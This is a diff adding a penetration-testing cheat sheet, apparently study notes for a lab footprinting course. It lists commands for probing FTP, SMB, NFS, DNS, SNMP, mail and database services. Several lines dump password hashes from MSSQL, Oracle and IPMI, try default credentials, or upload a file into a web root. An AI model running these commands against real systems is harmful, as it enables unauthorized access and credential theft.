@@ -1,0 +1,60 @@
+#ftp
+wget -m --no-passive ftp://anonymous:anonymous@$TARGET
+wget -r ftp://anonymous:anonymous@<TARGET_IP>/path/to/folder/
+anonymous:anonymous
+nc -nv $TARGET 21
+telnet $TARGET 21
+openssl s_client -connect $TARGET:21 -starttls ftp
+smbclient -N -L //$TARGET
+smbclient //$TARGET/SHARE
+sudo nmap $TARGET -sV -sC -p139,445
+rpcclient -U $USER $TARGET 
+samrdump.py $TARGET
+smbmap -H $TARGET
+crackmapexec smb $TARGET --shares -u '' -p ''
+enum4linux $TARGET -A
+showmount -e $TARGET
+sudo nmap $TARGET -p111,2049 -sV -sC
+sudo nmap --script nfs* $TARGET -sV -p111,2049
+sudo mount -t nfs $TARGET:/ ./localfolder/ -o nolock
+dig soa $DOMAINT
+dig ns inlanefreight.htb @$DNS
+dig CH TXT version.bind 10.129.120.85 
+dig any inlanefreight.htb @$DNS
+dig axfr inlanefreight.htb @$DNS
+for sub in $(cat $LWORDLIST);do dig $sub.inlanefreight.htb @$DNS | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
+dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f $LWORDLIST inlanefreight.htb
+telnet $TARGET 25 
+#pop3-imap
+sudo nmap $TARGET -sC -sV -p25
+sudo nmap $TARGET -p25 --script smtp-open-relay -v
+sudo nmap $TARGET -sV -p110,143,993,995 -sC
+curl -k 'imaps://$TARGET' --user user:p4ssw0rd
+curl -k 'imaps://$TARGET' --user cry0l1t3:1234 -v
+openssl s_client -connect $TARGET:pop3s
+openssl s_client -connect $TARGET:imaps
+#snmp
+snmpwalk -v2c -c public $TARGET
+onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt $TARGET
+braa public@$TARGET:.1.3.6.*
+#mysql
+sudo nmap $TARGET -sV -sC -p3306 --script mysql*
+mysql -u root -h $TARGET
+mysql -u root -pP4SSw0rd -h $TARGET
+#mssql
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET
+msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts $TARGET
+python3 mssqlclient.py Administrator@$TARGET -windows-auth
+#oracletns
+sudo nmap -p1521 -sV $TARGET --open
+sudo nmap -p1521 -sV $TARGET --open --script oracle-sid-brute
+odat.py all -s $TARGET
+sqlplus scott/tiger@$TARGET/XE
+sqlplus scott/tiger@$TARGET/XE as sysdba
+select name, password from sys.user$;
+./odat.py utlfile -s $TARGET -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./thefileyouwanttoupload.txt
+#ipmi
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+use auxiliary/scanner/ipmi/ipmi_version #msf
+use auxiliary/scanner/ipmi/ipmi_dumphashes #msf
+
